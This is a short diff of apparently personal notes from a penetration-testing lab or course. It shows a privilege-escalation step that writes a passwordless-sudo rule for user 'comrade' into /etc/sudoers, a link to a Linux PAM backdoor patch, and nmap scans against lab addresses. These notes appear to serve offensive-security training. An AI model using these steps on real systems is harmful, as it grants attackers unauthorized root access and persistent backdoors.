@@ -201,9 +201,17 @@ ON MACHINE BEING EXPLOITED
 17. test each tool of gtfo bins
 18. ./unkown /etc/sudoers "comrade ALL=(ALL) NOPASSWD:ALL"
 19. sudo -i
-20. 
+20.  
+https://github.com/zephrax/linux-pam-backdoor/blob/master/backdoor.patch
 
-
+#########################
+        DRY RUN 
+#########################
+10.50.39.115  Public Facing Website
+ssh -X student@10.50.22.28
+START LINOPS
+1. nmap -Pn 10.50.29.115 -p- -T4
+2. nmap -v -sT -Pn -T4 --script discovery 10.50.29.115 -T4
 
 
 
